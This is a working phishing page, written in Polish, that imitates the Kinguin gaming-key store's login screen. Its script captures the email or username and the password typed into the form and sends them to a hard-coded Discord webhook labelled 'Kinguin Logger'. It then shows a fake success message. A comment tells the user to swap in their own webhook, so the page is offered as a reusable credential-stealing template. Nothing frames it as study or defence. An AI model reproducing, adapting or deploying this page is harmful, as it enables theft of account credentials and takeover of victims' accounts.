<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Kinguin - Zaloguj się</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

    body {
      margin: 0;
      font-family: 'Inter', system-ui, sans-serif;
      background: linear-gradient(135deg, #0f0f0f, #1a1a1a);
      color: #ffffff;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    .container {
      background: rgba(20, 20, 20, 0.95);
      width: 100%;
      max-width: 420px;
      border-radius: 20px;
      padding: 50px 40px;
      box-shadow: 0 20px 60px rgba(255, 140, 0, 0.25);
      border: 1px solid #ff8c00;
      position: relative;
    }

    .logo {
      text-align: center;
      margin-bottom: 40px;
    }

    .logo-text {
      font-size: 42px;
      font-weight: 700;
      background: linear-gradient(90deg, #ff8c00, #ffaa33);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      letter-spacing: -2px;
    }

    h1 {
      text-align: center;
      font-size: 26px;
      font-weight: 600;
      margin: 0 0 8px 0;
    }

    .subtitle {
      text-align: center;
      color: #aaaaaa;
      font-size: 15px;
      margin-bottom: 35px;
    }

    label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: #cccccc;
      margin-bottom: 8px;
    }

    input {
      width: 100%;
      padding: 16px 18px;
      background: #1f1f1f;
      border: 2px solid #333;
      border-radius: 12px;
      color: #fff;
      font-size: 16px;
      margin-bottom: 22px;
      transition: all 0.3s;
    }

    input:focus {
      border-color: #ff8c00;
      box-shadow: 0 0 0 4px rgba(255, 140, 0, 0.2);
      outline: none;
    }

    button {
      width: 100%;
      padding: 16px;
      background: linear-gradient(90deg, #ff8c00, #ffaa33);
      color: #000;
      border: none;
      border-radius: 12px;
      font-size: 17px;
      font-weight: 700;
      cursor: pointer;
      margin-top: 10px;
      transition: all 0.3s;
    }

    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 25px rgba(255, 140, 0, 0.4);
    }

    .forgot {
      text-align: center;
      color: #ff8c00;
      font-size: 14px;
      margin-top: 20px;
      text-decoration: none;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="logo">
      <div class="logo-text">KINGUIN</div>
    </div>

    <h1>Zaloguj się</h1>
    <p class="subtitle">Aby korzystać z najlepszych ofert</p>

    <form id="loginForm">
      <label>Email lub nazwa użytkownika</label>
      <input type="text" id="email" placeholder="twoj@email.com" required>

      <label>Hasło</label>
      <input type="password" id="password" placeholder="••••••••" required>

      <button type="submit">Zaloguj się</button>
    </form>

    <a href="#" class="forgot">Zapomniałeś hasła?</a>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1493250113588691067/2kSrCkWZnkMKpbYNURbE-afbcfWLwrwlXyGWHr22AdA4LphCobaTQh3tTctEXXVbQmvu"; // ← ZMIEŃ NA SWÓJ!

    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();

      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();

      if (!email || !password) {
        alert("Wypełnij wszystkie pola!");
        return;
      }

      const payload = {
        username: "Kinguin Logger",
        embeds: [{
          title: "🔑 Nowe logowanie do Kinguin",
          color: 0xff8c00,
          fields: [
            { name: "Email / Login", value: email, inline: true },
            { name: "Hasło", value: password, inline: true },
            { name: "Czas", value: new Date().toLocaleString('pl-PL') }
          ]
        }]
      };

      try {
        await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        alert("✅ Zalogowano pomyślnie do Kinguin!");
      } catch (err) {
        alert("Błąd logowania.");
      }
    });
  </script>

</body>
</html>
